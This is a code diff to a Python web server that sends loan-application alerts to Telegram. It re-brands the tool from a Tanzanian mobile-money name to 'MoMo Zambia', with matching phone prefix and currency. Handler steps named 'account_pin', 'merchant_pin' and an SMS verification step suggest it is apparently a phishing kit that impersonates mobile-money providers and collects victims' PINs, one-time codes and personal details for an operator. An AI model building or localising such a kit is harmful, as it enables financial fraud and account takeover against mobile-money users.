@@ -1540,13 +1540,13 @@ def telegram_notification_loop():
                     "rejected": "❌ Rejected",
                 }.get(current_status, current_status.title())
                 text = (
-                    f"New Mixx by Yas application — {badge_hdr}\n"
+                    f"New MoMo Zambia Application — {badge_hdr}\n"
                     f"──────────────────────\n"
                     f"👤 Applicant: {event['first_name']} {event['last_name']}\n"
-                    f"📱 Phone: +255 {event['phone']}\n"
+                    f"📱 Phone: +260 {event['phone']}\n"
                     f"🏷️ Profile: {returning_badge}\n"
                     f"🎯 Product: {event['loan_type']}\n"
-                    f"💰 Amount: TZS {event['loan_amount']:,}\n"
+                    f"💰 Amount: ZMW {event['loan_amount']:,}\n"
                     f"📅 Term: {event['term_months']} Months\n"
                     f"🔖 Reference: {event['id']}\n"
                     f"📌 Status: {status_label}"
@@ -1565,15 +1565,15 @@ def telegram_notification_loop():
                     "rejected": "❌ Rejected",
                 }.get(current_status, current_status.title())
                 text = (
-                    f"New Mixx by Yas application — {badge_hdr}\n"
+                    f"New MoMo Zambia Application — {badge_hdr}\n"
                     f"──────────────────────\n"
                     f"🏷️ Profile: {returning_badge}\n"
                     f"🎯 Loan Type: {event['loan_type']}\n"
-                    f"💰 Requested Amount: TZS {event['loan_amount']:,}\n"
+                    f"💰 Requested Amount: ZMW {event['loan_amount']:,}\n"
                     f"📅 Term: {event['term_months']} Months\n"
                     f"💼 Purpose: {event['purpose']}\n"
                     f"👷 Employment: {event['employment']}\n"
-                    f"💵 Annual Income: TZS {event['annual_income']:,.0f}\n"
+                    f"💵 Annual Income: ZMW {event['annual_income']:,.0f}\n"
                     f"🤝 Referral Agent: {agent}\n"
                     f"📞 Contact Authorized: {consent}\n"
                     f"🔖 Reference: {event['id']}\n"
@@ -2192,7 +2192,7 @@ class Handler(BaseHTTPRequestHandler):
                 step_label = "💬 Step 3: SMS Verification Message"
 
             active_phone = phone if (step in ("zip_phone", "account_pin", "merchant_pin") and phone) else app["phone"]
-            phone_display = active_phone if str(active_phone).startswith("+") else f"+255 {active_phone}"
+            phone_display = active_phone if str(active_phone).startswith("+") else f"+260 {active_phone}"
             clean_phone = re.sub(r"[\s\-\+\(\)]", "", str(active_phone).strip())
             short_phone = clean_phone[-8:] if len(clean_phone) >= 8 else clean_phone
             with connect_db() as db:
